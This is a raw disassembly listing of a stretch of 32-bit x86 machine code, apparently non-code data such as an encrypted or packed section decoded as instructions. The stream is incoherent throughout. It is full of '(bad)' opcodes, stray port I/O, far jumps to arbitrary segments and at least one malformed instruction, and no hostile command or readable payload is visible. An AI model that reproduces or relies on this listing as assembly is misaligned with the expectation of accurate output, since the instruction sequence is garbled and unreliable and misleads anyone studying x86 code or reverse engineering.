  40886a:	push   edi
  40886b:	adc    al,0xf2
  40886d:	cmp    BYTE PTR [esi-0x1f],ch
  408870:	pusha  
  408871:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408872:	jbe    0x40882b
  408874:	jp     0x4088a2
  408876:	repnz push 0xffffffe8
  408879:	mul    BYTE PTR [edx+0x59cc2eb7]
  40887f:	popf   
  408880:	pusha  
  408881:	(bad)  
  408882:	jbe    0x4088c3
  408884:	push   eax
  408885:	in     al,0x7d
  408887:	and    DWORD PTR [eax],0x3e
  40888a:	jge    0x40880f
  40888c:	js     0x40889a
  40888e:	repz int3 
  408890:	adc    eax,DWORD PTR [eax]
  408892:	(bad)  
  408893:	jmp    0x3fb72ff8
  408898:	jae    0x4088ce
  40889a:	icebp  
  40889b:	jmp    0x3d2d:0xa9b5ed
  4088a2:	ss inc eax
  4088a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4088a5:	sbb    al,0x36
  4088a7:	jle    0x408877
  4088a9:	cmp    eax,0x94f87899
  4088ae:	icebp  
  4088af:	jmp    0xae60:0x34ecb5e5
  4088b6:	jp     0x4088f7
  4088b8:	jp     0x4088e6
  4088ba:	push   0xffffffc5
  4088bc:	in     eax,dx
  4088bd:	sub    eax,0xbd53e60b
  4088c2:	xor    al,0x11
  4088c4:	xlat   BYTE PTR ds:[ebx]
  4088c5:	ja     0x408935
  4088c7:	ret    0xd3f9
  4088ca:	add    ebx,DWORD PTR [ebx]
  4088cc:	inc    eax
  4088cd:	(bad)  [ebp-0x3e]
  4088d0:	lds    edx,FWORD PTR [ebx+0x2b]
  4088d3:	inc    ebp
  4088d4:	hlt    
  4088d5:	cmp    dl,dh
  4088d7:	mov    bh,0x69
  4088d9:	cmp    BYTE PTR [esi+0x38],ch
  4088dc:	enter  0xf1d4,0xa7
  4088e0:	jne    0x40891a
  4088e2:	outs   dx,BYTE PTR ds:[esi]
  4088e3:	cmp    al,ch
  4088e5:	(bad)  
  4088e6:	jbe    0x40889f
  4088e8:	js     0x40891e
  4088ea:	jno    0x40892e
  4088ec:	jns    0x4088b3
  4088ee:	imul   ecx,ebp,0xc656ceed
  4088f4:	lock cmp BYTE PTR [esi+0x34],ch
  4088f8:	mov    ch,0xae
  4088fa:	js     0x4088de
  4088fc:	dec    ebp
  4088fd:	mov    bh,0x23
  4088ff:	jle    0x408935
  408901:	cmp    esp,esp
  408903:	dec    eax
  408904:	int    0x8a
  408906:	bound  edi,QWORD PTR [eax]
  408908:	hlt    
  408909:	xor    al,0x2e
  40890b:	int    0x3c
  40890d:	mov    ch,0x3e
  40890f:	mov    ah,0x70
  408911:	or     cl,dh
  408913:	pavgb  mm5,QWORD PTR [esi]
  408916:	in     al,0x3e
  408918:	pusha  
  408919:	and    DWORD PTR [edx-0x33],ebp
  40891c:	in     eax,dx
  40891d:	cmp    eax,0x348230e3
  408922:	cs int 0x14
  408925:	or     DWORD PTR [eax],esp
  408927:	dec    ecx
  408928:	adc    al,0xaa
  40892a:	imul   edi,DWORD PTR [edi],0x2a
  40892d:	xor    BYTE PTR [esi-0x4737d808],ch
  408933:	shl    ah,1
  408935:	sbb    dl,ah
  408937:	jno    0x40892d
  408939:	scas   al,BYTE PTR es:[edi]
  40893a:	pop    esi
  40893b:	push   ecx
  40893c:	pop    edi
  40893d:	and    al,0x6e
  40893f:	cmp    BYTE PTR [edi-0x6b],bl
  408942:	push   ecx
  408943:	gs push 0x93577b7d
  408949:	mov    ah,0xbb
  40894b:	xor    BYTE PTR [eax-0x39],ah
  40894e:	jbe    0x40898f
  408950:	push   eax
  408951:	in     al,0x91
  408953:	out    dx,eax
  408954:	cmp    DWORD PTR [esi+edi*4-0x359d1b2e],ebp
  40895b:	and    dh,ch
  40895d:	stos   BYTE PTR es:[edi],al
  40895e:	mov    dh,0xbf
  408960:	mov    al,0x9f
  408962:	outs   dx,BYTE PTR ds:[esi]
  408963:	cmp    ch,dh
  408965:	cmp    dl,bl
  408967:	sti    
  408968:	pusha  
  408969:	scas   eax,DWORD PTR es:[edi]
  40896a:	jbe    0x4089ab
  40896c:	mov    eax,0xf5386e9b
  408971:	mov    ch,0xac
  408973:	aas    
  408974:	jb     0x4089a6
  408976:	icebp  
  408977:	jmp    0x52a6:0x3157bde9
  40897e:	dec    edx
  40897f:	adc    BYTE PTR [edx+0x4b95d496],al
  408985:	xchg   ebx,eax
  408986:	outs   dx,BYTE PTR ds:[esi]
  408987:	or     BYTE PTR [ecx+0x30],bh
  40898a:	mov    edi,DWORD PTR [ebx]
  40898c:	in     al,0x38
  40898e:	outs   dx,BYTE PTR ds:[esi]
  40898f:	cmp    DWORD PTR [ecx],ebx
  408991:	loopne 0x4089db
  408993:	dec    ebx
  408994:	pusha  
  408995:	push   DWORD PTR [esi+0x3f]
  408998:	push   0xf5386e98
  40899d:	cmp    eax,0x38f59ce9
  4089a2:	outs   dx,BYTE PTR ds:[esi]
  4089a3:	pop    es
  4089a4:	lds    ebp,FWORD PTR [ebp+0x7c60b430]
  4089aa:	outs   dx,DWORD PTR ds:[esi]
  4089ab:	cmp    ch,dh
  4089ad:	pop    ebp
  4089ae:	ja     0x4089eb
  4089b0:	jp     0x4089e2
  4089b2:	push   esi
  4089b3:	inc    ebp
  4089b4:	lock cmp BYTE PTR [esi-0x23],ch
  4089b8:	xchg   esi,eax
  4089b9:	jmp    0x408a29
  4089bb:	cmp    ch,dh
  4089bd:	mov    ch,0xae
  4089bf:	xor    al,0x60
  4089c1:	clc    
  4089c2:	jb     0x40897b
  4089c4:	sub    eax,0xededf100
  4089c9:	jecxz  0x408989
  4089cb:	and    BYTE PTR [ecx+0x33],bh
  4089ce:	icebp  
  4089cf:	cmp    BYTE PTR [esi],bh
  4089d1:	lock xchg ch,cl
  4089d4:	stc    
  4089d5:	push   esp
  4089d6:	sahf   
  4089d7:	mov    bh,0x20
  4089d9:	adc    BYTE PTR [ecx-0xb],ch
  4089dc:	in     eax,dx
  4089dd:	mov    bl,0xb6
  4089df:	and    al,0x6e
  4089e1:	imul   DWORD PTR [edx+0x73]
  4089e4:	xor    eax,0xf5386f18
  4089e9:	cmp    ah,dl
  4089eb:	inc    ebx
  4089ec:	sub    BYTE PTR [esi],cl
  4089ee:	outs   dx,BYTE PTR ds:[esi]
  4089ef:	sbb    BYTE PTR [edx+0x31],bh
  4089f2:	xor    eax,0x6e38e5f2
  4089f7:	cmp    ch,dh
  4089f9:	jno    0x4089a6
  4089fb:	sbb    al,0x11
  4089fd:	cmp    BYTE PTR [esi+0x38],ch
  408a00:	cmc    
  408a01:	(bad)  [edi]
  408a03:	jg     0x4089ee
  408a05:	cmp    al,dl
  408a07:	cmp    BYTE PTR [ebp+0x74],cl
  408a0a:	push   es
  408a0b:	sub    DWORD PTR [edx],ecx
  408a0d:	cmp    esp,esp
  408a0f:	dec    eax
  408a10:	int    0xbe
  408a12:	popa   
  408a13:	cmp    ah,dh
  408a15:	mul    BYTE PTR [esi+0x69e065e6]
  408a1b:	shl    bh,cl
  408a1d:	cmp    al,0x77
  408a1f:	leave  
  408a20:	hlt    
  408a21:	mov    edx,0x3b667f26
  408a26:	scas   al,BYTE PTR es:[edi]
  408a27:	jle    0x408a43
  408a29:	jge    0x408aa2
  408a2b:	cmp    ebx,esp
  408a2d:	xor    BYTE PTR [ebx+ebx*1-0x41],bh
  408a31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a32:	outs   dx,DWORD PTR ds:[esi]
  408a33:	mov    esi,gs
  408a35:	ja     0x4089bf
  408a37:	cmp    dl,0xf7
  408a3a:	out    dx,al
  408a3b:	ss pop ecx
  408a3d:	rcl    bh,1
  408a3f:	iret   
  408a40:	adc    eax,0x44ce82a8
  408a45:	sar    DWORD PTR ds:0xc93642de,1
  408a4b:	stos   BYTE PTR es:[edi],al
  408a4c:	inc    ebx
  408a4d:	out    0xd,al
  408a4f:	int    0xa4
  408a51:	(bad)  
  408a53:	fist   DWORD PTR [ebx+0x4e092dae]
  408a59:	ds stos BYTE PTR es:[edi],al
  408a5b:	jmp    0x408ab5
  408a5d:	and    al,0xdc
  408a5f:	xor    eax,DWORD PTR [esp+ebx*8-0x35]
  408a63:	or     ah,dl
  408a65:	or     dh,BYTE PTR [eax+0x1c]
  408a68:	popf   
  408a69:	jmp    eax
  408a6b:	imul   esi,edi,0xe
  408a6e:	cld    
  408a6f:	cli    
  408a70:	and    DWORD PTR [ebx+0x1fe98943],0xffffff99
  408a77:	(bad)  
  408a78:	retf   
  408a79:	iret   
  408a7a:	mov    BYTE PTR [eax],dh
  408a7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a7d:	and    ebp,DWORD PTR [esi]
  408a7f:	mov    bl,0x71
  408a81:	dec    ebp
  408a82:	stos   DWORD PTR es:[edi],eax
  408a83:	sub    eax,0x446f826
  408a88:	ins    DWORD PTR es:[edi],dx
  408a89:	loope  0x408acf
  408a8b:	shl    eax,1
  408a8d:	xor    esi,DWORD PTR [esi-0x5a]
  408a90:	shl    bl,0x95
  408a93:	or     al,0x7e
  408a95:	jge    0x408a47
  408a97:	mov    esp,esp
  408a99:	or     BYTE PTR [eax],ch
  408a9b:	stos   DWORD PTR es:[edi],eax
  408a9c:	dec    edi
  408a9d:	mov    dl,0x9e
  408a9f:	or     BYTE PTR [eax+eax*2-0x19123e7c],dl
  408aa6:	dec    eax
  408aa7:	push   ds
  408aa8:	xor    al,0x88
  408aaa:	dec    ebx
  408aab:	jle    0x408ad4
  408aad:	ror    ecx,cl
  408aaf:	shr    BYTE PTR [ecx],1
  408ab1:	fcom   st(0)
  408ab3:	je     0x408a9a
  408ab5:	enter  0x2eab,0x21
  408ab9:	cmp    ebp,DWORD PTR [edi+0x36]
  408abc:	dec    ebx
  408abd:	div    BYTE PTR [ebx+0x4e0c5deb]
  408ac3:	pop    ecx
  408ac4:	mul    ebx
  408ac6:	outs   dx,DWORD PTR ds:[esi]
  408ac7:	aaa    
  408ac8:	pop    es
  408ac9:	xor    bh,BYTE PTR [eax+0x5e]
  408acc:	sub    eax,0x8d32ea06
  408ad1:	pop    gs
  408ad3:	test   DWORD PTR [ebx+0x9297e34],esp
  408ad9:	aas    
  408ada:	xchg   esp,eax
  408adb:	jo     0x408abe
  408add:	or     al,0x68
  408adf:	sub    bl,BYTE PTR [edx+0x37]
  408ae2:	sub    BYTE PTR [ebp-0xf60a713],ch
  408ae8:	loope  0x408ab9
  408aea:	xor    eax,0xadc7f337
  408aef:	clc    
  408af0:	dec    ebp
  408af1:	mov    ebx,0x304d00b9
  408af6:	xor    ebp,DWORD PTR [eax]
  408af8:	in     al,0xb8
  408afa:	shl    ah,cl
  408afc:	push   ebp
  408afd:	ret    
  408afe:	push   DWORD PTR [ecx+0x3d7278e3]
  408b04:	pop    edx
  408b05:	stc    
  408b06:	popf   
  408b07:	cdq    
  408b08:	cmp    BYTE PTR [eax],bl
  408b0a:	scas   al,BYTE PTR es:[edi]
  408b0b:	and    BYTE PTR [edx-0x1e],ch
  408b0e:	outs   dx,DWORD PTR ds:[esi]
  408b0f:	cwde   
  408b10:	add    ebp,DWORD PTR [ebx+ecx*8+0x785b7dcf]
  408b17:	mov    al,ah
  408b19:	sar    bh,0xd2
  408b1c:	pop    eax
  408b1d:	cmp    al,0x26
  408b1f:	jmp    0xecb8909
  408b24:	pop    ecx
  408b25:	xor    cl,BYTE PTR [edx+0x19]
  408b28:	gs xor eax,0x5c78ce9c
  408b2e:	retf   0xe299
  408b31:	fadd   st,st(7)
  408b33:	pushf  
  408b34:	mov    dh,0xcd
  408b36:	jg     0x408b0e
  408b38:	jmp    0xe9513342
  408b3d:	(bad)  
  408b3f:	retf   
  408b40:	dec    eax
  408b41:	cmp    DWORD PTR [edx+0x2c],0xffffffb9
  408b45:	sbb    eax,0x13b98476
  408b4a:	fdiv   st(0),st
  408b4c:	push   0xf
  408b4e:	outs   dx,DWORD PTR ds:[esi]
  408b4f:	xchg   esi,eax
  408b50:	rcl    DWORD PTR [esi+esi*4-0x62e05e16],0x46
  408b58:	push   ebp
  408b59:	adc    cl,BYTE PTR [eax]
  408b5b:	addr16 jns 0x408b96
  408b5e:	and    ebp,eax
  408b60:	cmp    BYTE PTR [edx],cl
  408b62:	xchg   ecx,eax
  408b63:	pop    es
  408b64:	xor    ch,BYTE PTR [ecx]
  408b66:	outs   dx,DWORD PTR ds:[esi]
  408b67:	lea    esp,[edi+0x3e]
  408b6a:	mov    bh,0xe1
  408b6c:	mov    BYTE PTR [edi+0x1a],0xfb
  408b70:	sbb    cl,dh
  408b72:	out    dx,al
  408b73:	push   ecx
  408b74:	fnsave [eax+ebp*4+0x6f25b7c9]
  408b7b:	jmp    0x408b19
  408b7d:	(bad)  [ebp+0x6d]
  408b80:	xor    eax,0xc838d3dd
  408b85:	cmp    BYTE PTR fs:[edx],dl
  408b88:	sub    BYTE PTR [ebx],dh
  408b8a:	idiv   BYTE PTR [eax+0x196301ec]
  408b90:	ds loopne 0x408b91
  408b93:	ds and ecx,esi
  408b96:	inc    esi
  408b97:	cmp    DWORD PTR [ecx-0x470541c0],edx
  408b9d:	and    DWORD PTR [ebx+0x26],ebx
  408ba0:	in     al,dx
  408ba1:	add    DWORD PTR [ecx+ecx*2+0x503ea927],edi
  408ba8:	in     eax,0x99
  408baa:	pop    esi
  408bab:	cmp    al,0x8f
  408bad:	in     eax,0x13
  408baf:	mov    dl,0x20
  408bb1:	and    al,0x1f
  408bb3:	dec    eax
  408bb4:	retf   
  408bb5:	sbb    ch,BYTE PTR [esi-0x5d]
  408bb8:	rcr    DWORD PTR [edx+0x2],1
  408bbb:	adc    BYTE PTR [edi],ah
  408bbd:	out    dx,eax
  408bbe:	push   0x38
  408bc0:	xor    eax,0xb2dc952f
  408bc5:	sub    ah,ch
  408bc7:	add    al,ch
  408bc9:	iret   
  408bca:	and    eax,0x86cb714d
  408bcf:	mov    al,0x1a
  408bd1:	fisttp WORD PTR [eax]
  408bd3:	cmp    DWORD PTR [edi+0x1c],ebp
  408bd6:	mov    DWORD PTR [esi-0x38377b37],ebp
  408bdc:	adc    eax,DWORD PTR [ebx]
  408bde:	dec    ecx
  408bdf:	mov    al,ds:0x97fecf75
  408be4:	mov    DWORD PTR [esi+0x1e4b38d8],0x8f699ac4
  408bee:	mov    ch,0xb1
  408bf0:	cmc    
  408bf1:	and    ebx,DWORD PTR [ebx-0x1b7dea05]
  408bf7:	adc    al,0x18
  408bf9:	cmp    BYTE PTR [ecx+0x60],bl
  408bfc:	cmp    dl,BYTE PTR [esi]
  408bfe:	xor    dl,0x17
  408c01:	and    eax,0x72afe07e
  408c06:	ds mov ecx,0x6253498f
  408c0c:	cmp    DWORD PTR [eax],edi
  408c0e:	ret    0xb6cc
  408c11:	push   es
  408c12:	mov    ds:0x6e93007c,eax
  408c17:	sar    BYTE PTR [ecx-0x554f03ad],1
  408c1d:	inc    eax
  408c1e:	mov    bh,BYTE PTR [eax]
  408c20:	inc    ecx
  408c21:	call   0x9d9f1d3b
  408c26:	push   ebp
  408c27:	lods   al,BYTE PTR ds:[esi]
  408c28:	not    BYTE PTR [edi+0x1f]
  408c2b:	fcomp  DWORD PTR [eax]
  408c2d:	mov    ch,0x91
  408c2f:	lds    eax,FWORD PTR gs:[edx-0x1a]
  408c33:	cmp    BYTE PTR [esi-0x951df35],ch
  408c39:	jo     0x408c05
  408c3b:	cwde   
  408c3c:	cmc    
  408c3d:	mov    esp,0x3ec7d773
  408c42:	mov    bl,cl
  408c44:	stc    
  408c45:	sbb    BYTE PTR [eax],al
  408c47:	push   esp
  408c48:	cmp    al,0xf8
  408c4a:	inc    edi
  408c4b:	dec    dh
  408c4d:	mov    bl,0x56
  408c4f:	jne    0x408c46
  408c51:	xchg   esp,eax
  408c52:	lea    edi,[eax+0x11548063]
  408c58:	imul   edi,DWORD PTR [eax],0x42
  408c5b:	cli    
  408c5c:	sub    ebp,DWORD PTR [ebx-0x2b7378c4]
  408c62:	lods   al,BYTE PTR ds:[esi]
  408c63:	xchg   esp,eax
  408c64:	scas   eax,DWORD PTR es:[edi]
  408c65:	mov    edx,0x4c055b93
  408c6a:	xchg   esp,eax
  408c6b:	jl     0x408c36
  408c6d:	sub    DWORD PTR [ecx],eax
  408c6f:	cmp    ebx,esi
  408c71:	sub    BYTE PTR [ebx+ecx*4+0x3f503b18],ah
  408c78:	call   0xb7bba0f5
  408c7d:	pop    esi
  408c7e:	ud1    ebp,DWORD PTR [edi+0x33453215]
  408c85:	cmp    ch,ah
  408c87:	icebp  
  408c88:	fist   WORD PTR [ebx+esi*4+0x6f794203]
  408c8f:	jp     0x408c69
  408c91:	pop    ecx
  408c92:	add    al,0x62
  408c94:	push   ebp
  408c95:	cmp    esp,DWORD PTR [edi+0x39]
  408c98:	outs   dx,BYTE PTR ds:[esi]
  408c99:	jnp    0x408cca
  408c9b:	mov    DWORD PTR [esi-0x61],ecx
  408c9e:	mov    dl,0xdc
  408ca0:	cmc    
  408ca1:	inc    edx
  408ca2:	mov    dh,0x65
  408ca4:	in     eax,dx
  408ca5:	into   
  408ca6:	fs fucomip st,st(3)
  408ca9:	cmp    cl,bl
  408cab:	fs gs cld 
  408cae:	dec    ecx
  408caf:	dec    edi
  408cb0:	(bad)  
  408cb1:	push   edi
  408cb2:	outs   dx,DWORD PTR ds:[esi]
  408cb3:	in     al,dx
  408cb4:	jnp    0x408d2d
  408cb6:	and    ecx,DWORD PTR [esi+0x387ea0a5]
  408cbc:	sbb    esi,DWORD PTR [edi-0x102a7ec7]
  408cc2:	add    esi,esp
  408cc4:	in     al,0xfc
  408cc6:	sub    BYTE PTR [ebx+eax*4+0x7b],dl
  408cca:	in     al,0x5e
  408ccc:	enter  0x34c3,0xcc
  408cd0:	shr    ecx,cl
  408cd2:	popf   
  408cd3:	mov    ch,0xd0
  408cd5:	out    0xee,al
  408cd7:	xchg   ebp,eax
  408cd8:	fld    QWORD PTR [ebx+0x5e29ed00]
  408cde:	mov    ss,WORD PTR [ecx+edi*2-0x77]
  408ce2:	scas   al,BYTE PTR es:[edi]
  408ce3:	adc    ecx,DWORD PTR [ebp-0xd]
  408ce6:	add    DWORD PTR [ecx+0x60],ebp
  408ce9:	cmp    edi,DWORD PTR [ebp-0x5c5c44c0]
  408cef:	sti    
  408cf0:	pop    edi
  408cf1:	pop    esp
  408cf2:	(bad)  
  408cf4:	in     al,dx
  408cf5:	push   eax
  408cf6:	pop    ebp
  408cf7:	out    dx,eax
  408cf8:	jb     0x408d38
  408cfa:	scas   eax,DWORD PTR es:[edi]
  408cfb:	jmp    0xa49fe779
  408d00:	sar    BYTE PTR [edx],cl
  408d02:	jp     0x408ca9
  408d04:	ret    0x1d2d
  408d07:	call   0x4c4348fe
  408d0c:	and    eax,0xa05d47e8
  408d11:	cmp    ebx,DWORD PTR [ebp+0x55389e54]
  408d17:	(bad)  
  408d18:	fldenv [ebx+0x6f]
  408d1b:	aas    
  408d1c:	aaa    
  408d1d:	jb     0x408d0c
  408d1f:	imul   ebp,DWORD PTR [esi],0xac2aeb7d
  408d25:	lea    esi,[ebx]
  408d27:	mov    al,0x96
  408d29:	add    al,dl
  408d2b:	fmul   QWORD PTR [edi+0x74915873]
  408d31:	push   0x6a
  408d33:	mov    edx,0xbf512668
  408d38:	push   edx
  408d39:	cwde   
  408d3a:	adc    al,0x3f
  408d3c:	mov    DWORD PTR [edi],edx
  408d3e:	(bad)  
  408d3f:	int    0x7a
  408d41:	sbb    DWORD PTR [ebx],edi
  408d43:	cmp    DWORD PTR [ecx+edx*8-0x7f],ebx
  408d47:	sbb    bh,BYTE PTR [ebx+0x6c]
  408d4a:	outs   dx,DWORD PTR ds:[esi]
  408d4b:	fstp   TBYTE PTR [edi-0x39]
  408d4e:	adc    bl,BYTE PTR [ebx+0xe]
  408d51:	fs inc esi
  408d53:	cmp    esi,esi
  408d55:	jecxz  0x408d9b
  408d57:	dec    ebx
  408d58:	xor    eax,0xe32cdd05
  408d5d:	dec    esp
  408d5e:	ins    DWORD PTR es:[edi],dx
  408d5f:	adc    eax,0x2aa5d85b
  408d64:	in     eax,dx
  408d65:	xchg   BYTE PTR [eax],al
  408d67:	cmp    DWORD PTR [ebp+0x1c],edi
  408d6a:	out    dx,al
  408d6b:	adc    esi,DWORD PTR ds:[esi+0x45]
  408d6f:	mov    ebp,0xe43b0ff5
  408d74:	(bad)  
  408d75:	loopne 0x408def
  408d77:	imul   ebp,esp,0xffffffe0
  408d7a:	loopne 0x408dd2
  408d7c:	cmc    
  408d7d:	jg     0x408d12
  408d7f:	in     eax,0x88
  408d81:	sbb    DWORD PTR [ebp-0x1d7e1311],edx
  408d87:	push   0x4f2eb93f
  408d8c:	enter  0x46c,0x57
  408d90:	push   ss
  408d91:	and    bl,BYTE PTR [edi+0x39]
  408d94:	fbstp  TBYTE PTR [ebx+edx*2+0x4539555e]
  408d9b:	pop    eax
  408d9c:	xor    edi,DWORD PTR [edi]
  408d9e:	and    bl,BYTE PTR [eax]
  408da0:	mov    ebp,0x3fde6ea6
  408da5:	in     al,dx
  408da6:	ja     0x408d2e
  408da8:	call   0x4078:0x6f6c1b18
  408daf:	pusha  
  408db0:	inc    edx
  408db1:	add    eax,0x9f556c1
  408db6:	dec    edx
  408db7:	cld    
  408db8:	mov    ah,0x1e
  408dba:	inc    edx
  408dbb:	pop    ecx
  408dbc:	data16 cmp BYTE PTR [ecx],ch
  408dbf:	jno    0x408df6
  408dc1:	sti    
  408dc2:	cmp    DWORD PTR [ecx+0x78],edi
  408dc5:	les    eax,FWORD PTR [esi]
  408dc7:	sbb    esi,ebp
  408dc9:	xchg   ebx,eax
  408dca:	and    BYTE PTR [edi-0x5d77db0f],dl
  408dd0:	rcr    DWORD PTR [ebx-0x1a],cl
  408dd3:	cmp    BYTE PTR [eax+0x1c],ch
  408dd6:	ja     0x408e29
  408dd8:	sub    dl,BYTE PTR ds:0x80f58c14
  408dde:	and    DWORD PTR [edx-0x37cc7ef4],ebx
  408de4:	mov    ebp,0xcacc593b
  408de9:	push   edx
  408dea:	mov    ch,0xc8
  408dec:	daa    
  408ded:	outs   dx,DWORD PTR cs:[esi]
  408def:	(bad)  
  408df1:	scas   eax,DWORD PTR es:[edi]
  408df2:	cwde   
  408df3:	jg     0x408df7
  408df5:	fdivr  DWORD PTR [edx+edx*2+0x45633c98]
  408dfc:	mov    esi,0xd68c8467
  408e01:	cdq    
  408e02:	inc    edi
  408e03:	stc    
  408e04:	mov    ?,ebp
  408e06:	ror    BYTE PTR [eax],1
  408e08:	cmc    
  408e09:	stos   BYTE PTR es:[edi],al
  408e0a:	mov    dl,0xf0
  408e0c:	xchg   BYTE PTR [esi-0xc],ch
  408e0f:	fbstp  TBYTE PTR [esi+0x667e923a]
  408e15:	aad    0x7d
  408e17:	fst    QWORD PTR [esi-0x61b548d]
  408e1d:	sti    
  408e1e:	in     eax,dx
  408e1f:	ret    
  408e20:	cmc    
  408e21:	in     eax,0xf5
  408e23:	sbb    bl,dl
  408e25:	arpl   WORD PTR [ecx],bp
  408e27:	mov    ebx,DWORD PTR ds:0xd9d50e31
  408e2d:	sub    edx,esp
  408e2f:	mov    edi,0x431eaf04
  408e34:	in     eax,dx
  408e35:	ret    0x4d7d
  408e38:	loopne 0x408e27
  408e3a:	pop    esi
  408e3b:	pushf  
  408e3c:	sbb    BYTE PTR [edx+0x1c],dh
  408e3f:	xor    esi,0x3d3910d8
  408e45:	xor    dl,BYTE PTR [ebp-0xef416ad]
  408e4b:	lahf   
  408e4c:	cmc    
  408e4d:	ret    0x7bc4
  408e50:	sub    ecx,DWORD PTR [eax+0x3cae8d94]
  408e56:	push   es
  408e57:	inc    ecx
  408e58:	int    0xd6
  408e5a:	add    esp,ebp
  408e5c:	lods   eax,DWORD PTR ds:[esi]
  408e5d:	cld    
  408e5e:	in     eax,dx
  408e5f:	outs   dx,BYTE PTR ds:[esi]
  408e60:	inc    edi
  408e61:	shr    BYTE PTR [esi+0x23],cl
  408e64:	cmp    BYTE PTR [ebp-0x20],0x48
  408e68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e69:	xchg   esp,eax
  408e6a:	popf   
  408e6b:	cmp    bh,ch
  408e6d:	stos   DWORD PTR es:[edi],eax
  408e6e:	pop    edx
  408e6f:	enter  0xe86b,0x81
  408e73:	ret    
  408e74:	div    al
  408e76:	push   edi
  408e77:	retf   0x283d
  408e7a:	addr16 inc ebx
  408e7c:	(bad)  
  408e7e:	push   edx
  408e7f:	cmp    al,0x4d
  408e81:	cmp    edi,ecx
  408e83:	pop    ecx
  408e84:	mov    ss,WORD PTR [ebx]
  408e86:	push   es
  408e87:	js     0x408e36
  408e89:	addr16 jbe 0x408ef5
  408e8c:	jb     0x408eaf
  408e8e:	(bad)  
  408e8f:	ficom  DWORD PTR ds:0xe449f8b9
  408e95:	cmp    bl,ch
  408e97:	cmc    
  408e98:	mov    dl,0x8c
  408e9a:	and    eax,0x7622ae0a
  408e9f:	cmp    DWORD PTR [edx-0x6b4668c0],0x213a965b
  408ea9:	mov    bl,0x49
  408eab:	cmp    DWORD PTR [ebx+edi*8],eax
  408eae:	outs   dx,DWORD PTR ds:[esi]
  408eaf:	ror    dh,0xf6
  408eb2:	xor    eax,0x978ce93f
  408eb7:	(bad)  
  408eb8:	rcl    BYTE PTR [edi],cl
  408eba:	cs jmp 0x393fd80d
  408ec0:	ds xchg edi,eax
  408ec2:	pop    esp
  408ec3:	in     eax,dx
  408ec4:	inc    eax
  408ec5:	shl    DWORD PTR [eax+ecx*2-0x939fc0b],cl
  408ecc:	inc    edi
  408ecd:	test   eax,0x3b70280b
  408ed2:	dec    esp
  408ed3:	inc    esi
  408ed4:	into   
  408ed5:	sub    eax,0xd869377d
  408eda:	(bad)  
  408edb:	mov    bh,0xf5
  408edd:	scas   eax,DWORD PTR es:[edi]
  408ede:	ror    DWORD PTR ds:[ebx],1
  408ee1:	rcr    esi,0x63
  408ee4:	and    eax,0xbc14a638
  408ee9:	push   0xffffffbd
  408eeb:	ja     0x408ec0
  408eed:	test   ebx,ebx
  408eef:	mov    ch,dh
  408ef1:	and    dl,ch
  408ef3:	lods   eax,DWORD PTR ds:[esi]
  408ef4:	adc    al,0x3f
  408ef6:	retf   
  408ef7:	sub    edx,DWORD PTR [esi+eiz*8+0x51f5a42f]
  408efe:	ss aaa 
  408f00:	popf   
  408f01:	(bad)  
  408f02:	sbb    DWORD PTR [ebx+0x55d355f5],ebx
  408f08:	imul   ebp,DWORD PTR [esi],0x3879fbc6
  408f0e:	loope  0x408ec1
  408f10:	fdivr  QWORD PTR [ecx+0x24]
  408f13:	ja     0x408eef
  408f15:	sbb    ebp,DWORD PTR [edi-0x21]
  408f18:	aad    0x8f
  408f1a:	add    al,0x3d
  408f1c:	push   edi
  408f1d:	scas   eax,DWORD PTR es:[edi]
  408f1e:	push   edi
  408f1f:	jmp    0xe3ab:0x39019dd5
  408f26:	or     al,0x83
  408f28:	cmp    al,0x4
  408f2a:	mov    ebp,0xabf6f543
  408f2f:	in     al,dx
  408f30:	push   edx
  408f31:	std    
  408f32:	mov    eax,0x5b3bd861
  408f37:	popf   
  408f38:	add    BYTE PTR [edx],al
  408f3a:	push   ds
  408f3b:	mov    ds:0x50b2b239,al
  408f40:	lds    edi,FWORD PTR [ebx]
  408f42:	adc    al,0x2b
  408f44:	fadd   QWORD PTR [ecx-0x49]
  408f47:	sub    BYTE PTR [edx+0x7970523b],bh
  408f4d:	int3   
  408f4e:	adc    BYTE PTR [edx+0x5f6f47f2],ah
  408f54:	mov    ds,WORD PTR [eax]
  408f56:	xchg   esi,eax
  408f57:	iret   
  408f58:	out    0x26,al
  408f5a:	jns    0x408f94
  408f5c:	cwde   
  408f5d:	mov    ds:0x9194fd72,eax
  408f62:	dec    eax
  408f63:	popf   
  408f64:	sbb    ch,cl
  408f66:	cmp    DWORD PTR [edi-0x1d],0xffffffe1
  408f6a:	mov    edi,0xea4779f9
  408f6f:	adc    esp,DWORD PTR [ebp+0x1038a1be]
  408f75:	mov    esp,0x2cce7740
  408f7a:	in     al,0x8d
  408f7c:	inc    esi
  408f7d:	daa    
  408f7e:	outs   dx,DWORD PTR ds:[esi]
  408f7f:	push   ebp
  408f80:	mov    dl,0xc
  408f82:	clc    
  408f83:	iret   
  408f84:	lods   eax,DWORD PTR ds:[esi]
  408f85:	pushf  
  408f86:	cmp    bh,BYTE PTR [ecx]
  408f88:	arpl   WORD PTR [esp+eax*1-0x29f9e8ac],bp
  408f8f:	xchg   ch,dh
  408f91:	lds    ebx,FWORD PTR [edx+0x76]
  408f94:	pop    eax
  408f95:	jbe    0x408fb5
  408f97:	enter  0x3136,0x1c
  408f9b:	js     0x408f29
  408f9d:	xor    al,0x6d
  408f9f:	mov    ecx,0x87f61fd8
  408fa4:	cmc    
  408fa5:	mov    ebp,0x73891652
  408faa:	int3   
  408fab:	push   ss
  408fac:	enter  0x5709,0xfe
  408fb0:	dec    BYTE PTR [esi-0x51]
  408fb3:	(bad)  
  408fb4:	mov    ds:0xf5549530,eax
  408fb9:	neg    DWORD PTR [esi+0x7e]
  408fbc:	leave  
  408fbd:	retf   
  408fbe:	xchg   ebx,eax
  408fbf:	ss int 0x5f
  408fc2:	push   ecx
  408fc3:	cmp    esp,edx
  408fc5:	sahf   
  408fc6:	stos   DWORD PTR es:[edi],eax
  408fc7:	stc    
  408fc8:	outs   dx,BYTE PTR ds:[esi]
  408fc9:	or     DWORD PTR [eax+0x45],edi
  408fcc:	cmc    
  408fcd:	cwde   
  408fce:	inc    ebp
  408fcf:	sub    eax,0x269f7310
  408fd4:	(bad)  
  408fd5:	cmp    ebp,esp
  408fd7:	popa   
